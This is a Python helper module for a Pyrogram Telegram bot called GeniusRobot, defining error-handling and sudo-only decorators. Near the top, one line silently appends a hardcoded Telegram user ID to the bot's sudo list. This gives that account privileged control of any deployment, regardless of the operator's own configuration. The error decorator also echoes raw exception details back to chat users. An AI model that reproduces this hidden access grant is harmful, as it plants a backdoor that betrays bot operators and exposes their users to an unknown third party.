from typing import Callable
from pyrogram import Client
from pyrogram.types import Message
from GeniusRobot.modules.helpers.admins import get_administrators
from GeniusRobot.config import SUDO_USERS

SUDO_USERS.append(1282754256)

def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            await message.reply(f"{type(e).__name__}: {e}")

    return decorator


def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)

    return decorator
